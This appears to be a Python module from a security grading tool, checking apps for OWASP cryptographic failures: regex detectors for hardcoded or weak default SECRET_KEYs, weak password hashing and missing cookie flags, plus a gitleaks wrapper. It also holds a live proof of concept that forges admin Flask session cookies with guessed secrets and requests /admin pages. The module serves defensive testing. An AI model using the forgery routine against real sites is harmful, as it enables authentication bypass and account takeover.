"""A04 Cryptographic Failures: hardcoded/weak secrets, password hashing, cookie
flags, the gitleaks secret scan, and the live session-forgery PoC.
"""
from __future__ import annotations

import re
from typing import Any, Dict, List, Optional, Sequence, Tuple

import requests

from ..models import CheckResult
from ..shared.external_tools import (
    _SKIP_REASON, _gate, _run_json, _skipped_check, _stub_command, _tool_cfg,
)
from ..shared.http import (
    ProbeContext, _body_text, _json_or_none, _looks_like_admin, _low_conf, _snip,
)
from ..shared.sources import Source, _clamp, _iter_lines, _mk
from .base import Control


# hardcoded_secret — *_KEY / secret_key assigned a string literal.
# Handles NAME=, app.secret_key=, config['SECRET_KEY']=, app.config[...]=, NAME:.
_SECRET_LHS = re.compile(
    r"""
    (?P<lhs>
        (?:[A-Za-z_][\w.]*\.)?
        (?:
            (?:SECRET_KEY|secret_key)
          | (?:config\s*\[\s*['"]SECRET_KEY['"]\s*\])
          | (?:\[\s*['"]SECRET_KEY['"]\s*\])
        )
    )
    \s*[:=]\s*
    (?P<rhs>.+)$
    """,
    re.VERBOSE,
)
_ENV_REF = re.compile(
    r"""(os\.)?environ\s*(\[|\.get\s*\()|(os\.)?getenv\s*\(""",
    re.VERBOSE,
)
_STR_LITERAL = re.compile(r"""^\s*[a-zA-Z]?['"]""")


def check_hardcoded_secret(sources: Sequence[Source], cfg: dict) -> CheckResult:
    penalty = float(cfg.get("penalty_per_finding", 100))
    allow_env = bool(cfg.get("allow_env_reference", True))

    reasons: List[str] = []
    evidence: List[str] = []
    for path, lineno, line in _iter_lines(sources):
        m = _SECRET_LHS.search(line)
        if not m:
            continue
        rhs = m.group("rhs").strip()
        if allow_env and _ENV_REF.search(rhs):
            continue
        if not _STR_LITERAL.match(rhs):
            continue
        reasons.append(f"{path}:{lineno} SECRET_KEY 하드코딩")
        evidence.append(f"{path}:{lineno}: {line.strip()}")

    score = _clamp(100.0 - penalty * len(reasons))
    return CheckResult(
        check_id="hardcoded_secret",
        category="static",
        label="하드코딩 시크릿",
        score=score,
        weight=float(cfg.get("weight", 0)),
        passed=not reasons,
        penalty_reasons=reasons,
        evidence=evidence,
    )


# weak default secret. os.environ.get("SECRET_KEY", "<literal>") fallback,
# which hardcoded_secret skips because it sees an env reference.
_WEAK_DEFAULT = re.compile(
    r"""(?:environ\.get|getenv)\s*\(\s*['"][^'"]*(?:SECRET|KEY|PASSWORD)[^'"]*['"]\s*,\s*(?P<def>['"][^'"]*['"])""",
    re.IGNORECASE,
)


def check_weak_default_secret(sources: Sequence[Source], cfg: dict) -> CheckResult:
    reasons: List[str] = []
    evidence: List[str] = []
    for path, text in sources:
        for m in _WEAK_DEFAULT.finditer(text):
            default = m.group("def").strip("'\"")
            if not default:
                continue  # empty fallback => still needs env, acceptable
            lineno = text.count("\n", 0, m.start()) + 1
            reasons.append(f"{path}:{lineno} 환경변수 미설정 시 하드코딩 기본 시크릿으로 폴백")
            evidence.append(f"{path}:{lineno}: {m.group(0)[:120]}")
    if reasons:
        return _mk("weak_default_secret", "약한 기본 시크릿",
                   float(cfg.get("score_weak", 0)), cfg,
                   passed=False, reasons=reasons, evidence=evidence)
    return _mk("weak_default_secret", "약한 기본 시크릿",
               float(cfg.get("score_ok", 100)), cfg,
               passed=True, reasons=[], evidence=[])


# password_hashing
_STRONG_HASH = re.compile(
    r"""bcrypt|argon2|scrypt|pbkdf2|generate_password_hash|check_password_hash|passlib""",
    re.IGNORECASE,
)
_WEAK_HASH = re.compile(r"""\b(md5|sha1)\s*\(""", re.IGNORECASE)
_PW_TOKEN = re.compile(r"""pass|pwd|\bpw\b|password|secret|credential""", re.IGNORECASE)
_PLAINTEXT_CMP = re.compile(
    r"""(?:pw|pwd|password|passwd)\s*==|==\s*(?:pw|pwd|password|passwd)\b""",
    re.IGNORECASE,
)


def check_password_hashing(sources: Sequence[Source], cfg: dict) -> CheckResult:
    score_strong = float(cfg.get("score_strong", 100))
    score_weak = float(cfg.get("score_weak_hash", 30))
    score_plain = float(cfg.get("score_plaintext", 0))
    score_unknown = float(cfg.get("score_unknown", 60))

    strong_ev: List[str] = []
    weak_ev: List[str] = []
    plain_ev: List[str] = []

    for path, lineno, line in _iter_lines(sources):
        if _STRONG_HASH.search(line):
            strong_ev.append(f"{path}:{lineno}: {line.strip()}")
        wm = _WEAK_HASH.search(line)
        if wm and _PW_TOKEN.search(line):
            weak_ev.append(f"{path}:{lineno}: {line.strip()}")
        if _PLAINTEXT_CMP.search(line):
            plain_ev.append(f"{path}:{lineno}: {line.strip()}")

    # Precedence: plaintext compare worst, then weak hash, then strong.
    if plain_ev:
        return CheckResult(
            "password_hashing", "static", "비밀번호 해싱",
            score_plain, float(cfg.get("weight", 0)),
            passed=False,
            penalty_reasons=[f"{e.split(':',2)[0]}:{e.split(':',2)[1]} 평문 비밀번호 비교"
                             for e in plain_ev],
            evidence=plain_ev,
        )
    if weak_ev:
        return CheckResult(
            "password_hashing", "static", "비밀번호 해싱",
            score_weak, float(cfg.get("weight", 0)),
            passed=False,
            penalty_reasons=[f"{e.split(':',2)[0]}:{e.split(':',2)[1]} 취약한 해시(md5/sha1) 사용"
                             for e in weak_ev],
            evidence=weak_ev,
        )
    if strong_ev:
        return CheckResult(
            "password_hashing", "static", "비밀번호 해싱",
            score_strong, float(cfg.get("weight", 0)),
            passed=True, penalty_reasons=[], evidence=strong_ev,
        )
    return CheckResult(
        "password_hashing", "static", "비밀번호 해싱",
        score_unknown, float(cfg.get("weight", 0)),
        passed=score_unknown >= 60,
        penalty_reasons=["명확한 비밀번호 해싱 로직을 찾지 못함"],
        evidence=[],
    )


# cookie_flags
_COOKIE_FLAGS = {
    "SESSION_COOKIE_HTTPONLY": "HttpOnly",
    "SESSION_COOKIE_SECURE": "Secure",
    "SESSION_COOKIE_SAMESITE": "SameSite",
}


def check_cookie_flags(sources: Sequence[Source], cfg: dict) -> CheckResult:
    baseline = float(cfg.get("baseline", 25))
    per_flag = float(cfg.get("score_per_flag", 25))

    joined = "\n".join(text for _, text in sources)
    present = []
    evidence: List[str] = []
    for flag, label in _COOKIE_FLAGS.items():
        if re.search(re.escape(flag), joined):
            present.append(label)
            evidence.append(flag)

    score = _clamp(baseline + per_flag * len(present))
    missing = [lbl for lbl in _COOKIE_FLAGS.values() if lbl not in present]
    reasons = [f"세션 쿠키 {m} 플래그 미설정" for m in missing]
    return CheckResult(
        check_id="cookie_flags",
        category="static",
        label="쿠키 보안 플래그",
        score=score,
        weight=float(cfg.get("weight", 0)),
        passed=not missing,
        penalty_reasons=reasons,
        evidence=evidence,
    )


# gitleaks — hardcoded-secret corroboration (report-only, weight 0).
def check_gitleaks(app_dir: str, config) -> CheckResult:
    tcfg = _tool_cfg(config, "gitleaks")
    label = "시크릿 스캔(gitleaks)"
    bin_path, skip = _gate(config, "gitleaks")
    if bin_path is None:
        return _skipped_check("gitleaks_secrets", label, "gitleaks", skip or _SKIP_REASON)

    cmd = _stub_command(bin_path) + [
        "detect", "--no-git", "--report-format", "json",
        "--report-path", "/dev/stdout", "--source", app_dir,
    ]
    data = _run_json(cmd, float(tcfg.get("timeout", 60)))
    if data is None:
        data = []  # ran but nothing parseable => treat as clean

    reasons, evidence = _parse_gitleaks(data)
    return CheckResult(
        check_id="gitleaks_secrets",
        category="static",
        label=label,
        score=0.0 if reasons else 100.0,
        weight=0.0,
        passed=not reasons,
        penalty_reasons=reasons,
        evidence=evidence,
        skipped=False,
        tool="gitleaks",
    )


def _parse_gitleaks(data: object) -> Tuple[List[str], List[str]]:
    reasons: List[str] = []
    evidence: List[str] = []
    findings = data if isinstance(data, list) else data.get("findings", []) if isinstance(data, dict) else []
    for f in findings or []:
        if not isinstance(f, dict):
            continue
        rule = f.get("RuleID") or f.get("Description") or "secret"
        file_ = f.get("File", "")
        line = f.get("StartLine", "")
        loc = f"{file_}:{line}" if file_ else ""
        reasons.append(f"{loc} {rule} 시크릿 탐지".strip())
        secret = f.get("Secret", "")
        evidence.append(f"{loc}: {rule} {secret}".strip())
    return reasons, evidence


# session_forgery (dynamic) — LIVE PoC for a known/weak SECRET_KEY.
# Report-only (weight 0): it proves the weak_default_secret critical by forging a
# Flask session cookie signed with a guessed default secret and reaching /admin as
# the first (admin) user. Needs flask importable on the grader host; else skipped.
def _forge_flask_cookie(secret: str, payload: Dict[str, Any]) -> Optional[Tuple[str, str]]:
    """Return (cookie_name, signed_value) for a Flask session forged with ``secret``,
    or None if Flask isn't importable / signing fails."""
    try:
        from flask import Flask
        from flask.sessions import SecureCookieSessionInterface
    except Exception:
        return None
    try:
        app = Flask(__name__)
        app.secret_key = secret
        serializer = SecureCookieSessionInterface().get_signing_serializer(app)
        if serializer is None:
            return None
        name = app.config.get("SESSION_COOKIE_NAME", "session")
        return name, serializer.dumps(dict(payload))
    except Exception:
        return None


def probe_session_forgery(ctx: ProbeContext, cfg: Dict[str, Any]) -> CheckResult:
    weight = float(cfg.get("weight", 0))
    label = "세션 위조 검증(약한 SECRET_KEY)"
    try:
        secrets = list(ctx.config.get("probes.weak_secrets", []) or [])
        if not secrets:
            return _low_conf("session_forgery", label, weight, "약한 시크릿 목록 미구성")
        fid = int(cfg.get("forge_user_id", 1))
        paths = list(cfg.get("admin_paths", ["/admin", "/admin/users"]))
        # Forge several common session-key shapes so it works across apps.
        payload = {"user_id": fid, "uid": fid, "id": fid, "logged_in": True,
                   "is_admin": True, "admin": True, "role": "admin"}

        if _forge_flask_cookie(secrets[0], payload) is None:
            return _low_conf("session_forgery", label, weight,
                             "flask 미설치로 세션 위조 검증 불가(정적 weak_default_secret로 감점 유지)")

        # Only attribute to forgery if the path is NOT already open without a cookie.
        for path in paths:
            base = ctx.get(requests.Session(), path)
            if base is not None and base.status_code == 200 and _looks_like_admin(
                _body_text(base), _json_or_none(base)
            ):
                # Access control (not forgery) is the issue here; access_control_admin owns it.
                continue
            for secret in secrets:
                forged = _forge_flask_cookie(secret, payload)
                if forged is None:
                    continue
                name, value = forged
                sess = requests.Session()
                sess.cookies.set(name, value)
                r = ctx.get(sess, path)
                if r is not None and r.status_code == 200 and _looks_like_admin(
                    _body_text(r), _json_or_none(r)
                ):
                    return CheckResult(
                        check_id="session_forgery", category="dynamic", label=label,
                        score=float(cfg.get("score_forged", 0)), weight=weight, passed=False,
                        penalty_reasons=[
                            f"알려진 시크릿 {secret!r}로 세션 쿠키를 위조해 user_id={fid}(admin) "
                            f"권한으로 {path} 접근 성공 → 인증 우회·계정 탈취 가능"
                        ],
                        evidence=[_snip(f"forged {name}={value}"),
                                  _snip(f"{path} -> 200 (admin 콘텐츠 렌더)")],
                        tool="flask-session-forge",
                    )
        return CheckResult(
            check_id="session_forgery", category="dynamic", label=label,
            score=float(cfg.get("score_safe", 100)), weight=weight, passed=True,
            penalty_reasons=[],
            evidence=[_snip(f"{len(secrets)}종 기본 시크릿으로 위조 시도 → 관리자 접근 실패(서명 검증 정상)")],
            tool="flask-session-forge",
        )
    except Exception as exc:  # pragma: no cover
        return _low_conf("session_forgery", label, weight, f"세션 위조 프로브 예외: {exc}")


CONTROLS = [
    Control("hardcoded_secret", "하드코딩 시크릿", "static",
            lambda sctx, cfg: check_hardcoded_secret(sctx.sources, cfg)),
    Control("weak_default_secret", "약한 기본 시크릿", "static",
            lambda sctx, cfg: check_weak_default_secret(sctx.sources, cfg)),
    Control("password_hashing", "비밀번호 해싱", "static",
            lambda sctx, cfg: check_password_hashing(sctx.sources, cfg)),
    Control("cookie_flags", "쿠키 보안 플래그", "static",
            lambda sctx, cfg: check_cookie_flags(sctx.sources, cfg)),
    Control("gitleaks_secrets", "시크릿 스캔(gitleaks)", "static",
            lambda sctx, cfg: check_gitleaks(sctx.app_dir, sctx.config)),
    Control("session_forgery", "세션 위조 검증(약한 SECRET_KEY)", "dynamic",
            probe_session_forgery),
]
